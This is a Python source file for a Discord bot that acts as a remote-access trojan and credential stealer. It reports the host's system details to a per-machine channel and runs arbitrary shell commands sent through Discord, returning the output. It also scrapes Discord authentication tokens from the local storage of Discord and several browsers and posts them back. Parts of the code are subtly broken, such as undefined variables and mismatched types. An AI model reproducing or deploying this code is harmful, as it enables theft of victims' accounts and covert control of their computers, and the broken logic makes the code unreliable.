from urllib.request import Request, urlopen
import discord
import hashlib
import platform
import os
from discord.ext import commands
import sys
import subprocess
import re


required_packages = ["discord", "os", "platform",
                     "hashlib", "re", "json", "urllib"]

for package in required_packages:
    try:
        __import__(package)
    except ImportError:
        subprocess.check_call(
            [sys.executable, "-m", "pip", "install", package])


intents = discord.Intents.default()
intents.messages = True
intents.message_content = True

TOKEN = os.environ.get('BOT_TOKEN')

if not TOKEN:
    TOKEN = input("Enter your bot token: ")
    os.environ['BOT_TOKEN'] = TOKEN

bot = commands.Bot(command_prefix='', intents=intents)
bot.text_channel = None
bot.connected_pc_count = 0


@bot.event
async def on_ready():
    print(f'We have logged in as {bot.user.name}')

    system_info = get_system_info()  # Function to get system information
    hash_object = hashlib.md5(system_info.encode())
    global channel_name
    channel_name = hash_object.hexdigest()[:7]
    guild = bot.guilds[0]

    existing_channel = discord.utils.get(
        guild.channels, name=channel_name, type=discord.ChannelType.text)
    if existing_channel:
        channel_name = existing_channel
        print(f'Using existing channel: {existing_channel.name}')
    else:
        bot.text_channel = await guild.create_text_channel(channel_name)
        print(f'Created new channel: {bot.text_channel.name}')

    try:
        await system_info(bot.text_channel)
    except Exception as e:
        print(f'Error sending system information: {e}')

    await update_presence()

# Add a function to get system information


def get_system_info():
    system_info = f"System: {platform.system()} {platform.version()}\n"
    system_info += f"Machine: {platform.machine()}\n"
    system_info += f"Processor: {platform.processor()}"
    return system_info


@bot.event
async def on_message(message):
    if message.author.bot:
        return

    if message.channel != channel_name:
        return

    await bot.process_commands(message)


def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens


@bot.command(name='use')
async def execute_command(ctx, *args):

    command = ' '.join(args)  # Combine all arguments into a single string
    try:
        # Execute the system command
        result = subprocess.check_output(command, shell=True, text=True)
        await ctx.send(f"""``{result}``""")
    except subprocess.CalledProcessError as e:
        await ctx.send(f"""``{e}``""")


@bot.command(name='find_tokens')
async def find_tokens_command(ctx):
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    if local is None or roaming is None:
        await ctx.send("Error: Unable to retrieve environment variables.")
        return

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += str(f'\n**{platform}**\n```\n')

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

        message += '```'

    await ctx.send(message)


@bot.command(name='systeminfo')
async def system_info(ctx):
    try:
        system_info = f"System: {platform.system()} {platform.version}\n"
        system_info += f"Machine: {platform.machine()}\n"
        system_info += f"Processor: {platform.processor()}"

        hash_object = hashlib.md5(system_info.encode())
        system_hash = hash_object.hexdigest()

        await ctx.send(f"""```\n{system_info}\n || System Hash: {system_hash}```""")
    except Exception as e:
        await ctx.send(f'Error getting system information:\n```\n{e}\n```')


@bot.command(name='connectedcount')
async def connected_count(ctx):
    await ctx.send(f"Number of connected PCs: {bot.connected_pc_count}")


async def update_presence():
    activity = discord.Game(name=f"Connected PCs: {bot.connected_pc_count}")
    await bot.change_presence(activity=activity)

bot.run(TOKEN)
